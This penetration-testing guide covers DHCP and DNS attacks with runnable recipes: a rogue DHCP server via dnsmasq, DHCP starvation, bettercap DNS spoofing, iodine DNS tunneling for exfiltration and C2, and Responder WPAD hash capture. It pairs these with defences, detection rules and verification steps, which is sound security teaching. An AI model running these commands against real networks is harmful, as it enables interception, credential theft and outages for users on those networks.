# DNS and DHCP Attacks

Attacks against the two protocols that bootstrap and resolve every
network: DHCP (who am I, where is the gateway) and DNS (where is this
name). Both are unauthenticated in their original design. A single
rogue DHCP offer can redirect a whole subnet; a poisoned DNS cache
can silently hijack every outbound connection.

> [!CAUTION]
> A rogue DHCP server can take an entire subnet offline or redirect
> all traffic through the attacker. DHCP starvation can exhaust the
> legitimate pool and prevent new devices from joining. Only run
> these attacks against networks you own or have written authorization
> to test.

---

## 1. Overview

### DHCP (RFC 2131)

Four-message handshake: DISCOVER -> OFFER -> REQUEST -> ACK. The
client has no way to verify that the server is legitimate. Any host
on the broadcast domain can answer DISCOVER with an OFFER. If the
rogue responds first, the client accepts it.

A rogue DHCP server can hand out:

- Attacker as the default gateway (full MITM).
- Attacker as the DNS server (DNS hijack).
- A different subnet mask (misrouting).
- A WPAD URL (proxy auto-discovery, credential capture).

### DNS (RFC 1035)

DNS has no authentication in its original form. A resolver accepts
the first answer for a name. Any attacker who can spoof a UDP packet
from the configured resolver's IP can inject a forged answer. Cache
poisoning (Kaminsky attack) writes false records into a resolver's
cache, affecting all clients behind it.

DNSSEC (RFC 4033) fixes this in theory. In practice, adoption is
incomplete, especially on internal resolvers.

---

## 2. Reconnaissance / Enumeration

### 2.1 Identify the current DHCP configuration

```bash
# Linux
cat /etc/resolv.conf
ip route
nmcli dev show | grep -i dhcp

# Windows
ipconfig /all
```

Note the DHCP server IP, the DNS server IP, and the lease time. The
DHCP server is usually the same as the default gateway, but not always.

### 2.2 Identify the DNS resolver(s)

```bash
# Which resolver does this host use?
cat /etc/resolv.conf
# Ask the resolver itself
dig @<resolver> version.bind chaos txt

# Check if DNSSEC is enforced
dig +dnssec cloudflare.com
dig +short test.dnssec-or-not.net TXT
```

Expected output (unsigned response):

```text
; EDNS: version: 0, flags:; udp: 1232
;; ANSWER SECTION:
cloudflare.com.  300  IN  A  104.16.132.229
```

If `flags: do` is absent and there is no RRSIG record, DNSSEC is not
enforced on this resolver.

### 2.3 Enumerate DNS records (if zone transfer is allowed)

```bash
dig AXFR @<nameserver> example.local
```

A zone transfer returns the entire zone. Misconfigured internal DNS
often allows it from any source.

---

## 3. Common Attack Vectors

### 3.1 Rogue DHCP server

The attacker runs a DHCP server that answers DISCOVER before the
legitimate one. The victim accepts the attacker's OFFER (first
response wins). The attacker now controls the victim's gateway, DNS,
and optionally a WPAD URL.

**Impact:** full MITM per victim. Scale to the whole subnet with a
single rogue server.

### 3.2 DHCP starvation

The attacker sends thousands of DISCOVER messages with random MAC
addresses. The legitimate DHCP server allocates a lease for each,
exhausting the pool. New clients cannot get an IP.

**Impact:** denial of service against new devices. Does not affect
already-leased clients.

**Combination attack:** starve the legitimate server, then offer
leases from a rogue server. Since the real server has no addresses
left, every new client accepts the attacker's offer.

### 3.3 DNS cache poisoning

Classic Kaminsky attack: send many queries for a random subdomain of
the target zone, and for each query send many spoofed responses with
guessed transaction IDs and source ports. If one guess matches before
the real answer arrives, the resolver caches the forged record.

**Modern relevance:** source port randomization (since 2008) makes
this attack require ~2^32 packets on average. Still feasible against
misconfigured resolvers that use a fixed source port.

### 3.4 DNS spoofing on-path

If the attacker is already on-path (ARP spoofing, rogue DHCP), they
can answer DNS queries directly before the real resolver responds.
Trivial with bettercap.

### 3.5 DNS tunneling

Exfiltrate data or establish C2 over DNS. The attacker controls an
authoritative nameserver for a domain they own. The victim's resolver
forwards queries; the attacker's server answers with data encoded in
TXT or A records.

**Impact:** bypasses most egress firewalls (DNS is usually allowed).
Used by malware for C2 and exfiltration.

### 3.6 WPAD hijack

Web Proxy Auto-Discovery. If the client queries for `wpad.local` and
receives an answer, it downloads a proxy configuration. A rogue DHCP
server can point to the attacker's WPAD file, and the client sends
all HTTP traffic through the attacker - including NTLM authentication.

**Related:** see file 06 for NTLM relay via WPAD.

---

## 4. Exploitation Recipes

### 4.1 Rogue DHCP with dnsmasq

```bash
# Minimal rogue DHCP server
sudo dnsmasq \
  --interface=eth0 \
  --dhcp-range=10.0.0.100,10.0.0.200,12h \
  --dhcp-option=3,10.0.0.66 \
  --dhcp-option=6,10.0.0.66 \
  --dhcp-authoritative \
  --no-daemon
```

Options:

- `3` = default gateway (attacker IP).
- `6` = DNS server (attacker IP).
- `--dhcp-authoritative` = respond as if we are the only DHCP server.

Expected output (dnsmasq log):

```text
dnsmasq-dhcp: DHCPDISCOVER(eth0) 00:11:22:33:44:55
dnsmasq-dhcp: DHCPOFFER(eth0) 10.0.0.150 00:11:22:33:44:55
dnsmasq-dhcp: DHCPREQUEST(eth0) 10.0.0.150 00:11:22:33:44:55
dnsmasq-dhcp: DHCPACK(eth0) 10.0.0.150 00:11:22:33:44:55
```

### 4.2 DHCP starvation with dhcpstarv

```bash
sudo dhcpstarv -i eth0 -e 10.0.0.250 -n 1000
```

Or with yersinia:

```bash
sudo yersinia -I
# Press '5' for DHCP
# Choose "sending DHCP DISCOVER packets"
```

### 4.3 DNS spoofing with bettercap

```bash
sudo bettercap -iface eth0
# Inside bettercap:
#   set dns.spoof.domains *.internal.corp
#   set dns.spoof.address 10.0.0.66
#   dns.spoof on
```

Every DNS query from the victim for `*.internal.corp` now resolves
to the attacker.

### 4.4 DNS cache poisoning with dnscapy (lab only)

```bash
# Requires knowledge of the resolver's source port and transaction ID
# Use in a lab to demonstrate the concept
sudo dnscapy --dns-port 53 --target 10.0.0.1 --spoof-ip 10.0.0.66
```

### 4.5 DNS tunneling with iodine

```bash
# Server side (attacker controls tunnel.example.com)
sudo iodined -f -c -P <PASSWORD> 10.0.0.1 tunnel.example.com

# Client side (victim)
sudo iodine -f -P <PASSWORD> tunnel.example.com
```

Expected output (client):

```text
Opened dns0
Setting DNS tunnel up
Server tunnel IP is 10.0.0.1
Sending DNS queries for tunnel.example.com
Autodetecting DNS query type (use -T to override): A
Setting upstream DNS server to 10.0.0.1
```

The victim now has a `dns0` interface with the server's tunnel IP.
All traffic through that interface is encapsulated in DNS queries.

### 4.6 WPAD hijack with Responder

```bash
sudo responder -I eth0 -w -F
```

`-w` starts the WPAD rogue proxy, `-F` forces NTLM authentication
on the proxy. Clients that receive a rogue DHCP offer (with WPAD URL)
will authenticate to the attacker.

---

## 5. Post-Exploitation

After a successful rogue DHCP or DNS attack:

- **MITM all new DHCP clients** on the subnet (gateway = attacker).
- **Redirect or intercept DNS** queries for targeted domains.
- **Capture NTLM hashes** via WPAD proxy (file 06).
- **Establish DNS C2** if the network only allows DNS outbound.
- **Exfiltrate data** via DNS TXT queries (slow, but hard to block).

Combine with ARP spoofing (file 01) for already-leased clients:
rogue DHCP only affects new leases, ARP spoofing affects everyone.

---

## 6. Risk Context (AppSec)

| Factor | Value |
|--------|-------|
| Typical severity | High (rogue DHCP) to Critical (DNS cache poisoning) |
| Preconditions | Attacker on the same broadcast domain as the victim |
| Detectability | Medium - DHCP snooping and DNS monitoring catch it |
| Business impact | Full MITM, credential theft, data exfiltration |

Rogue DHCP is a **foothold expansion** primitive: it converts a
single Layer 2 access into MITM over every new client on the subnet.
DNS cache poisoning affects every client behind the resolver.

---

## 7. Root Causes (AppSec)

- DHCP has no server authentication (clients trust the first OFFER).
- DNS has no response authentication without DNSSEC.
- DHCP snooping is disabled on access switches.
- DNS resolvers are not configured to randomize source ports (legacy).
- Internal DNS zones are not signed with DNSSEC.
- WPAD is enabled on clients but no WPAD server is deployed (silent
  fallback to whatever answers).

---

## 8. Preventive Controls (AppSec)

### 8.1 DHCP snooping

```text
! Cisco IOS
ip dhcp snooping
ip dhcp snooping vlan 10,20
ip dhcp snooping database flash:dhcp-snooping.db
interface GigabitEthernet0/1
 ip dhcp snooping trust
!
interface range GigabitEthernet0/2-24
 ip dhcp snooping limit rate 10
```

Trusted ports (toward the real DHCP server) can send OFFER/ACK.
Untrusted ports can only send DISCOVER/REQUEST. Rogue OFFERs on
untrusted ports are dropped.

### 8.2 DNS response validation

- Enable DNSSEC validation on all resolvers.
- Sign internal zones if the infrastructure supports it.
- Block outbound DNS from hosts to anything except the internal
  resolver (egress filtering, see file 05).

### 8.3 Disable WPAD if not used

```text
# Windows - via Group Policy
Computer Configuration > Administrative Templates > Windows Components
> Internet Explorer > Disable "Automatically detect settings"
```

Or set the registry value:

```text
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings
  AutoDetect = 0
  EnableAutoProxyResultCache = 0
```

If WPAD is required, deploy a legitimate WPAD server and block the
`.local` WPAD query at the resolver.

### 8.4 DNS sinkhole / RPZ

A DNS sinkhole (Response Policy Zone) redirects known-bad domains
to a monitoring IP. Useful for blocklists and detecting C2.

### 8.5 Rate limiting

- On DHCP: `ip dhcp snooping limit rate` on untrusted ports.
- On DNS: rate-limit queries per source IP at the resolver.

### 8.6 Port security (see file 02)

Prevents a single physical port from generating thousands of DHCP
DISCOVERs with random MACs. Combined with DHCP snooping rate limits,
starvation becomes impractical.

---

## 9. Detection Controls (AppSec)

### 9.1 Rogue DHCP server detection

- Multiple DHCP servers on the same subnet (compare OFFERs from
  different MACs).
- DHCP OFFER from a MAC that is not a known server.
- DHCP option 3 (gateway) pointing to a workstation IP.

**Zeek/Bro script (conceptual):**

```text
event dhcp_message(c: connection, is_orig: bool, msg: DHCP::Msg, options: DHCP::Options)
    {
    if (msg$msg_type == DHCP::OFFER && c$id$orig_h !in known_dhcp_servers)
        NOTICE([$note=DHCP::Rogue_Server,
                $msg=fmt("DHCP OFFER from unexpected server %s", c$id$orig_h)]);
    }
```

### 9.2 DNS anomaly detection

- High volume of queries for random subdomains (tunneling).
- TXT queries larger than usual (data exfiltration).
- Queries to newly-registered domains (DGA detection).
- Response TTL of 0 (attacker-controlled, no caching).

### 9.3 DHCP starvation detection

- Sudden spike in DISCOVER messages from many MACs.
- MAC addresses in the same OUI or random (locally-administered bit set).
- Pool exhaustion alarms on the DHCP server.

### 9.4 SIEM rules

- Alert if two DHCP servers are seen within 5 minutes on the same VLAN.
- Alert on DHCP pools over 80% utilisation.
- Alert on >100 DNS queries for `<random>.example.com` in 1 minute.

---

## 10. Verification (AppSec)

Test the controls after deployment:

1. **DHCP snooping:** run dnsmasq on an untrusted port. Clients
   should still get leases from the legitimate server.
2. **DHCP rate limit:** send 1000 DISCOVERs from one port. The port
   should err-disable after the limit.
3. **DNSSEC:** query a signed domain through the internal resolver.
   With `dig +dnssec`, the response should include RRSIG records.
4. **Egress DNS filtering:** from a client, `dig @8.8.8.8 example.com`
   should be blocked. Only the internal resolver answers.
5. **WPAD:** query `wpad.local` from a client. It should return NXDOMAIN
   (or the legitimate WPAD server), not an attacker's IP.

---

## 11. OSCP Notes

DHCP and DNS attacks are **not** directly part of the OSCP exam. They
are relevant for:

- The PEN-200 "Pivoting" module (DNS tunneling as a pivot method).
- Real internal engagements where you have Layer 2 access.
- Post-exploitation C2 over DNS.

For the exam report, DNS tunneling and WPAD hijack are good examples
of "creative exfiltration paths" if you encounter them. The standard
exam focuses on TCP-based attacks.

---

## 12. Production Notes

- **Rogue DHCP is highly disruptive.** A misconfigured rogue server
  can take a subnet offline in minutes. Always test in a lab first,
  and have a rollback plan (stop dnsmasq, wait for leases to expire,
  or force renew on affected hosts).
- **DHCP starvation can crash small DHCP servers** (IoT routers,
  consumer APs). Test in a lab first.
- **DNS cache poisoning is slow and probabilistic.** Do not expect
  it to work against a well-configured resolver. It is a proof of
  concept, not a reliable attack in 2026.
- **DNS tunneling requires an authoritative nameserver.** You cannot
  tunnel through a resolver you do not control. Set up the domain
  first (e.g. tunnel.example.com -> your VPS).
- **WPAD is dead in most enterprises** (disabled by default since
  Windows 10 1709). It still appears in legacy environments and in
  some internal tooling.

---

## 13. References

- RFC 2131 - Dynamic Host Configuration Protocol
- RFC 1035 - Domain Names - Implementation and Specification
- RFC 4033 - DNS Security Introduction and Requirements
- RFC 2132 - DHCP Options and BOOTP Vendor Extensions
- [MITRE ATT&CK T1557 - Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557/)
- [MITRE ATT&CK T1071.004 - DNS](https://attack.mitre.org/techniques/T1071/004/)
- NIST SP 800-115 - Technical Guide to Information Security Testing
- dnsmasq manual (https://thekelleys.org.uk/dnsmasq/doc.html)
- iodine project (https://code.kryo.se/iodine/)
- Responder (https://github.com/lgandx/Responder)